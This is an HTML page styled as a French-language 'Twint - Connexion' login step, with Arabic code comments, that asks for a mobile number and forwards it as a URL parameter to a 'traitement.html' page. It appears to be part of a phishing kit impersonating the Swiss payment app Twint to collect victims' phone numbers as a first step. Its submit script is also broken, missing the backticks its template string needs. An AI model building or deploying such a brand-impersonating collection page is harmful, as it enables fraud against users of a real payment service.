<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twint - Connexion</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #f8f8f8; color: #333; text-align: center; font-size: 16px; padding: 20px; }


        /* الحاوية الرئيسية */
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }

        /* الصورة العلوية */
        .image-container { margin-bottom: 15px; }
        .image-container img { width: 120px; }

        /* عنوان الإدخال */
        h2 { font-size: 20px; margin-bottom: 5px; }
        p { color: #666; margin-bottom: 20px; }

        /* حقل إدخال الهاتف */
        input { width: 100%; padding: 12px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; text-align: center; outline: none; }
        input:focus { border-color: #007AFF; }

        /* الأزرار */
        .buttons { margin-top: 20px; }
        button { width: 100%; padding: 12px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer; }
        .btn-primary { background: #ccc; color: white; }
        .btn-primary:disabled { background: #eee; color: #aaa; cursor: not-allowed; }
        .btn-secondary { background: none; color: #007AFF; margin-top: 10px; }

        /* الروابط */
        .terms { font-size: 12px; color: #666; margin-top: 15px; }
        .terms a { color: #007AFF; text-decoration: none; }
    </style>
</head>
<body>


    <!-- الحاوية الرئيسية -->
    <div class="container">
        <div class="image-container">
            <img src="photo_2025-03-05_02-45-20.jpg" alt="Phone">
        </div>

        <h2>Veuillez saisir votre numéro</h2>
        <p>Veuillez saisir votre numéro de portable.</p>

        <!-- إدخال رقم الهاتف -->
        <input type="tel" id="phone-number" placeholder="+417 6 123 456 78" oninput="validateInput()">

        <!-- الأزرار -->
        <div class="buttons">
            <button id="submit-btn" class="btn-primary" disabled onclick="submitForm()">Suivant</button>
            <button class="btn-secondary" onclick="history.back()">Retour</button>
        </div>

        <!-- الشروط والسياسات -->
        <p class="terms">
            En donnant mon numéro de portable, j'accepte les 
            <a href="#">conditions générales</a> et je prends connaissance de la 
            <a href="#">politique de confidentialité</a>.
        </p>
    </div>

    <script>
        function validateInput() {
            let phoneInput = document.getElementById("phone-number").value;
            let button = document.getElementById("submit-btn");
            let phoneRegex = /^\+?\d{7,15}$/; // رقم هاتف صالح
            button.disabled = !phoneRegex.test(phoneInput);
        }

        function submitForm() {
            let phoneInput = document.getElementById("phone-number").value;
            window.location.href = traitement.html?phone=${encodeURIComponent(phoneInput)};
        }
    </script>

</body>
</html>
